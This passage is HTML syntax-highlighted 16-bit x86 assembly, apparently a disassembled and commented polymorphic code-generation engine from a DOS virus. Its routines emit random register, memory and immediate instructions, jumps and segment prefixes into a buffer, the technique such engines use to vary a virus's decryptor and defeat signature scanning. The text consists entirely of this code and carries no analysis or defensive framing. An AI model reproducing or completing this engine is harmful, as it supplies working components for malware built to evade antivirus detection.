                    </span><span class="sc1">; pointer</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">handle_table</span><span class="sc0">

</span><span class="sc5">continue_it</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">end_app_block1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">end_free_blck1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">loc_0_56B</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">start_of_free</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">lower_limit</span><span class="sc1">; can't generate code below this</span><span class="sc0">
                    </span><span class="sc1">; adress</span><span class="sc0">

</span><span class="sc5">loc_0_56B</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">where_2_jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">where_2_jmp</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">compute_jmp_siz</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; writ down jmp size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">handle_table</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">mvd_bdy_200_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">table_pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; put end of block mark there</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BCh</span><span class="sc0"> </span><span class="sc1">; ¼     ; mov SP, word</span><span class="sc0">
</span><span class="sc5">sp_copy</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; MOV AX,word</span><span class="sc0">
</span><span class="sc5">end_app_block2</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">2400h</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">select_reg_mem</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Eh</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">movsreg__rm</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">

</span><span class="sc5">movsreg__rm</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_opcode</span><span class="sc0"> </span><span class="sc1">; word or byte register</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_not_sreg</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000111b</span><span class="sc0">   </span><span class="sc1">; clear reg field</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">is_not_sreg</span><span class="sc0"> </span><span class="sc1">; ES generated</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">override_switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">is_not_sreg</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000b</span><span class="sc0">  </span><span class="sc1">; DS generated</span><span class="sc0">

</span><span class="sc5">is_not_sreg</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; if operation with byte,  is not</span><span class="sc0">
                    </span><span class="sc1">; necessary to check for SP</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">do_not_fix_regs</span><span class="sc0">

</span><span class="sc5">fix_reg_field</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">         </span><span class="sc1">; in ModR/M byte</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">     </span><span class="sc1">; get reg field in ModR/M byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">; SP generated ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">skip_SP_fix</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; can't be SP, put BP there !</span><span class="sc0">

</span><span class="sc5">skip_SP_fix</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">do_not_fix_regs</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lahf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">   </span><span class="sc1">; mod field 00 ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_mod_00</span><span class="sc0">  </span><span class="sc1">; no,</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111b</span><span class="sc0">    </span><span class="sc1">; get r/m field</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">; word displacement ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rnd_word</span><span class="sc0">
        </span><span class="sc6">sahf</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">bx_di_disp</span><span class="sc0">  </span><span class="sc1">; si in adressing, jump</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">bx_di_disp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bx_disp</span><span class="sc0">     </span><span class="sc1">; [bx+(disp)] ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">bx_di_disp</span><span class="sc0">  </span><span class="sc1">; [bp+di=(disp)] ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">bx_disp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">bx_disp</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc1">; returns 0 - FF</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">loc_0_60F</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

</span><span class="sc5">loc_0_60F</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_mod_00</span><span class="sc0">

</span><span class="sc5">bx_di_disp</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">not_mod_00</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; is displacement 8 bit?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_8_bit_disp</span><span class="sc0">

</span><span class="sc5">rnd_byte</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">loc_0_627</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">loc_0_627</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">write_byte</span><span class="sc0">

</span><span class="sc5">not_8_bit_disp</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">locret_0_640</span><span class="sc0">

</span><span class="sc5">rnd_word</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">

</span><span class="sc5">write_word</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; AL and the AH</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">locret_0_640</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; selection of 8 bit regs</span><span class="sc0">

</span><span class="sc5">get_word_reg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_8</span><span class="sc0">   </span><span class="sc1">; returns 0 to 7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; SP generated ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">make_opcode</span><span class="sc0"> </span><span class="sc1">; make opcode and write it</span><span class="sc0">
                    </span><span class="sc1">; down</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; replace SP with BP</span><span class="sc0">

</span><span class="sc5">make_opcode</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; make opcode and write it</span><span class="sc0">
</span><span class="sc5">get_word_reg</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">            </span><span class="sc1">; down</span><span class="sc0">



</span><span class="sc5">write_byte</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; to es:di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">adress_used</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">mvd_bdy_200_1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">write_byte</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">OPER_R_RM</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">      </span><span class="sc1">; aritm&amp;log operation,MOV,CMP reg,reg/mem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">gr_lg_artm_mov</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">select_reg_mem</span><span class="sc0">  </span><span class="sc1">; 1st opcode byte selected</span><span class="sc0">


</span><span class="sc5">MOVREG_IMM</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">    </span><span class="sc1">; mov ax, ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_mov_byte_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_word_reg</span><span class="sc0">    </span><span class="sc1">; selection of 8 bit regs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rnd_word</span><span class="sc0">

</span><span class="sc5">_mov_byte_reg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_8</span><span class="sc0">   </span><span class="sc1">; returns 0 to 7</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">    </span><span class="sc1">; mov reg8, byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">

</span><span class="sc5">jmp_2_jmp_rndb</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rnd_byte</span><span class="sc0">

</span><span class="sc5">OPERAL_IM_MEM</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">grp_al_im8_r8</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_byte</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; mov al/ax,mem ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jmp_2_jmp_rndw</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">jmp_2_jmp_rndw</span><span class="sc0">  </span><span class="sc1">; put word immediate</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp_2_jmp_rndb</span><span class="sc1">; put byte immediate</span><span class="sc0">

</span><span class="sc5">jmp_2_jmp_rndw</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rnd_word</span><span class="sc0">

</span><span class="sc5">PUSH_OR_POPsreg</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_3</span><span class="sc0">   </span><span class="sc1">; returns 0 - 2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">no_push</span><span class="sc0">     </span><span class="sc1">; if ax = 0 generate segment prefix ES,CS,SS,DS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">try_pop_Sreg</span><span class="sc1">; if ax=1 try generate pop sreg</span><span class="sc0">

</span><span class="sc5">make_push_sreg</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">push_counter</span><span class="sc0">

</span><span class="sc5">no_push</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_4</span><span class="sc0">   </span><span class="sc1">; returns 0 - 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">make_opcode</span><span class="sc1">; make opcode and write it</span><span class="sc0">

</span><span class="sc5">try_pop_Sreg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; ...</span><span class="sc0">
